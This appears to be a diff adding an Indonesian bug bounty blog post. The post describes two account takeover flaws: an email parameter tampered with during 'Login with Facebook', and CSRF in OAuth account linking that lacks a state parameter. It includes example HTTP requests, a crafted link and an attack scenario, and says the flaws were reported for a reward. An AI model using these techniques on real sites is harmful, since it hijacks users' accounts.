@@ -1,0 +1,77 @@
+I"�<p><img src="/images/acc_takeover.jpg" alt="Account Takeover" /></p>
+
+<p>Banyak sekali website diluar sana yang menerapkan fitur <code class="highlighter-rouge">"Login with Facebook"</code> dengan tujuan untuk memudahkan pengguna dalam mendaftarkan atau membuat akun pada website mereka. Namun sayangnya ada beberapa website yang kurang memperhatikan sisi keamanan dalam menggunakan fitur ini yang pada akhirnya berpotensi menjadi celah keamanan.</p>
+
+<p><strong>NOTE:</strong> Metode ini penulis terapkan ketika melakukan hunting pada Private Bug Bounty program, maka dari itu penulis meminimalisir penggunaan screenshot untuk melindungi privasi website yang bersangkutan.</p>
+
+<p><strong>PARAMETER TAMPERING on “Login with Facebook”</strong></p>
+
+<p>Penulis menemukan sebuah website dengan fitur <code class="highlighter-rouge">"Login with Facebook"</code>, yang menarik adalah ketika kita menggunakan fitur tersebut, data yang di-ekstrak dari Facebook (dalam hal ini alamat email) dikirim ke server target menggunakan <code class="highlighter-rouge">GET</code> request, dan tentunya kita dapat memodifikasi request tersebut dengan mengganti alamat email yang akan di-kirim ke server dengan alamat email lain.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /page/frames.php?f=xxx&amp;p=xxx&amp;jn=xxx&amp;kode=1234567890&amp;email=root@noobsec.org&amp;name=Tomi HTTP/1.1
+
+Host: redacted.co.id
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+Accept: text/html, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Cookie: [redacted]
+</code></pre></div></div>
+
+<p>Dalam hal ini, dengan mengganti parameter email dengan alamat email korban, maka kita akan dapat mengakses akun tersebut.</p>
+
+<p><strong>CSRF on “Linked Social Media Account”</strong></p>
+
+<p>Kali ini celah terdapat pada sebuah website yang memiliki fitur <code class="highlighter-rouge">"Linked Social Media Account"</code> yang pada dasarnya fungsi tersebut mirip dengan <code class="highlighter-rouge">"Login with Facebook"</code>. Berbeda dengan sebelumnya yang tidak memerlukan interaksi apapun, trik ini memerlukan interaksi dari korban.</p>
+
+<p><img src="/images/socmed_link.png" alt="Linked Social Media Account" /></p>
+
+<p>Normalnya, ketika kita menggunakan Oauth, Facebook akan merespon dengan memberikan dua buah parameter, yaitu <code class="highlighter-rouge">token</code> dan <code class="highlighter-rouge">state</code>. Dimana parameter state ini berfungsi sebagai Anti CSRF. Namun terdapat website yang tidak menggunakan parameter state tersebut sehingga hal ini berpotensi menjadi celah CSRF.</p>
+
+<p>Berikut adalah request untuk mendapatkan token Facebook</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /v3.1/dialog/oauth?response_type=code&amp;redirect_uri=https%3A%2F%2Fredacted.com%2F&amp;scope=email%2Cpublic_profile&amp;client_id=00000000000 HTTP/1.1
+Host: www.facebook.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: [redacted]
+</code></pre></div></div>
+
+<p>Dan ini adalah request ketika menghubungkan akun Facebook</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /api/oauth/facebook?code=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx HTTP/1.1
+Host: redacted.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: [redacted]
+</code></pre></div></div>
+
+<p>Dapat dilihat bahwa hanya terdapat parameter <code class="highlighter-rouge">code</code> pada request tersebut dan artinya terdapat celah CSRF disitu. Pada kasus ini, website target membuat <em>tokennya</em> sendiri dari Facebook token yang didalamnya tentu saja sudah terdapat parameter <code class="highlighter-rouge">token</code> dan <code class="highlighter-rouge">state</code>nya yang kemudian di-generate dan di-kirim ke server melalui parameter <code class="highlighter-rouge">code</code>.</p>
+
+<p>Dengan begitu, attacker cukup mengirimkan link berisi <code class="highlighter-rouge">code</code> tersebut ke user target.</p>
+
+<p>Contoh link:</p>
+
+<p><code class="highlighter-rouge">https://redacted.com/api/oauth/facebook?code=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></p>
+
+<p><strong>Attack Scenario</strong></p>
+<ol>
+  <li>Attacker meng-generate Facebook token</li>
+  <li>Attacker mengirim link tersebut pada target</li>
+  <li>Ketika target meng-klik link tersebut, otomatis akunnya akan terhubung dengan akun Facebook Attacker</li>
+  <li>Attacker dapat login ke akun target menggunakan Facebook miliknya</li>
+</ol>
+
+<p>By the way, celah ini penulis temukan pada sebuah website Trading Platform. Admin website tersebut memberikan reward atas laporan ini hehehe.</p>
+
+<p><img src="/images/reward_acc_takeover.png" alt="Linked Social Media Account Reward" /></p>
+
+<p>Demikian tulisan ini dibuat, semoga bermanfaat.</p>
+
+<p>Referensi: https://medium.com/@Jacksonkv22/oauth-misconfiguration-lead-to-complete-account-takeover-c8e4e89a96a</p>
+:ET
